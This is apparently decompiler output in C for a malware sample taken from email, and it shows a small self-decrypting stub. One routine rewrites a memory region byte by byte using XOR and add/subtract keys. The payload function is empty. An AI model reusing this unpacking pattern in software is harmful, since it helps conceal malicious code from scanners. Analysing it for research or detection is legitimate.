// subject.c
// Generated on 5/4/2015 12:14:35 AM by decompiling malware_via_email/malware_0042/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000()
{
	byte cl_15;
	word32 eax_16 = fn00401078(0x00401135, 0x0000062E, out cl_15);
	fn00401135(eax_16, cl_15);
	byte cl_34;
	fn00401078(0x00401135, 0x0000062E, out cl_34);
	if (false)
	{
		Mem47[fp - 0x00000018:word32] = 0x00405000;
		Mem49[fp - 0x0000001C:word32] = 0x00401000;
		lstrcpyA(Mem49[fp - 0x0000001C:LPSTR], Mem49[fp - 24:LPCSTR]);
	}
	return;
}

word32 fn00401078(word32 dwArg04, word32 dwArg08, ptr32 clOut)
{
	*clOut = cl;
	word32 dwLoc08_22 = 0x00000000;
	while (dwLoc08_22 < dwArg08)
	{
		if (dwLoc08_22 > 0x00000000 && (dwLoc08_22 & 0x00000001) == 0x00000000)
		{
			word32 eax_117 = dwLoc08_22 + dwArg04;
			Mem124[dwArg04 + dwLoc08_22:byte] = (byte) (DPB(eax_117, Mem0[eax_117 + 0x00000000:byte], 0, 8) ^ 0x00000015);
		}
		if (dwLoc08_22 > 0x00000002 && (dwLoc08_22 - 0x00000002 & 0x00000001) == 0x00000000)
			Mem107[dwArg04 + dwLoc08_22:byte] = Mem0[dwArg04 + dwLoc08_22:byte] + 0x93;
		if (dwLoc08_22 > 0x00000003)
		{
			word32 edx_69 = dwLoc08_22 - 0x00000003;
			if (SEQ(edx_69 >> 0x0000001F, edx_69) % 0x00000003 == 0x00000000)
			{
				word32 eax_85 = dwLoc08_22 + dwArg04;
				Mem91[dwArg04 + dwLoc08_22:byte] = (byte) (DPB(eax_85, Mem0[eax_85 + 0x00000000:byte], 0, 8) - 0x00000073);
			}
		}
		word32 ecx_53 = dwArg04 + dwLoc08_22;
		Mem63[ecx_53 + 0x00000000:byte] = Mem0[dwLoc08_22 + dwArg04:byte] - (byte) dwLoc08_22;
		byte cl_54;
		*clOut = (byte) ecx_53;
		dwLoc08_22 = dwLoc08_22 + 0x00000001;
	}
	return dwLoc08_22;
}

void fn00401135(word32 eax, byte cl)
{
fn00401135_entry:
l00401135:
fn00401135_exit:
}

